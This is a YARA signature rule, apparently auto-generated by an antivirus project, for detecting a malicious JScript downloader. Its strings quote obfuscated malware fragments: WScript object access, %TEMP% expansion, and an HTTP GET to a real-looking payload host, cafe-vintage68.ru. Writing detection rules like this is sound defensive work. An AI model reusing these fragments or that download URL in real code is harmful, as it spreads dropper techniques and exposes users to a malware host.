rule sig_20160428_7eef5e8fa3e2ebef2dba255c0b46ed49 {
  meta:
    description = "datamaliciousorder - file 20160428_7eef5e8fa3e2ebef2dba255c0b46ed49.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "063a6682d86fe32e32fbbcd3731687e8b9d51481ba3cf92e60d2b60e1bcfcc1b"

  strings:
    $s1  = "function IrfKdaIylTlaUmbAuaXmf() {return QzcRqhFvpRggWvnYdbZmd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s2  = "function WgqSxhBaoEdzGkyKouBqa(KdfPsyNwxKxcNfoAfvQpk){QzcRqhFvpRggWvnYdbZmd[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function WgqSxhBaoEdzGkyKouBqa(KdfPsyNwxKxcNfoAfvQpk){QzcRqhFvpRggWvnYdbZmd[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function DojPioGhnQqvCseRtwCkt(OfdOmnKrmHcmIatKnwQoz, XklIzkBozQgfPmeCxuIvx){CxzPwvYfcStnQtoAcjKxz = CxzPwvYfcStnQtoAcjKxz * 1; " ascii
    $s5  = "return OfdOmnKrmHcmIatKnwQoz - XklIzkBozQgfPmeCxuIvx;};" fullword ascii
    $s6  = "var QzcRqhFvpRggWvnYdbZmd = function SjqBfdLilPrhOwnJvkEyw() {return ZqdNqhQvtRlkZahYdkSje[VdcAtoMzqDugNucTqsKsf](\"WScript\"+\"" ascii
    $s7  = "var ZqdNqhQvtRlkZahYdkSje = this[\"WScript\"];" fullword ascii
    $s8  = "function IrfKdaIylTlaUmbAuaXmf() {return QzcRqhFvpRggWvnYdbZmd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "var QzcRqhFvpRggWvnYdbZmd = function SjqBfdLilPrhOwnJvkEyw() {return ZqdNqhQvtRlkZahYdkSje[VdcAtoMzqDugNucTqsKsf](\"WScript\"+\"" ascii
    $s10 = "if (IfdJmhUrwKhpLoqSwvGmj[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s11 = "function DojPioGhnQqvCseRtwCkt(OfdOmnKrmHcmIatKnwQoz, XklIzkBozQgfPmeCxuIvx){CxzPwvYfcStnQtoAcjKxz = CxzPwvYfcStnQtoAcjKxz * 1; " ascii
    $s12 = "function OniFukFxjAgsCecFeoVxc(){return DnrDptDmyNpuQypWivAer + \"\";};" fullword ascii
    $s13 = "IfdJmhUrwKhpLoqSwvGmj[BsoNwoQfsXmzIojAjbLxf](\"G\" + \"ET\", \"http://cafe-vintage68.ru/asad2fl\", false);" fullword ascii
    $s14 = "function CdgTbsCdxOiyJvsZskQki() {return ((WxaXzhYlqHcmGjpUyaWhp == true) && (WxaXzhYlqHcmGjpUyaWhp == RaxBecFeuUvcPzmHaxYqm)) ?" ascii
    $s15 = "function CdgTbsCdxOiyJvsZskQki() {return ((WxaXzhYlqHcmGjpUyaWhp == true) && (WxaXzhYlqHcmGjpUyaWhp == RaxBecFeuUvcPzmHaxYqm)) ?" ascii
    $s16 = "function IprBjaFknRdhKfeSftQrq()" fullword ascii
    $s17 = "var WxaXzhYlqHcmGjpUyaWhp = false;" fullword ascii
    $s18 = "}while (OnaBfjOuqCpeEocErpEkj);" fullword ascii
    $s19 = "WxbOgfUwjTzrJagHowOvs = true;" fullword ascii
    $s20 = "var RaxBecFeuUvcPzmHaxYqm = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}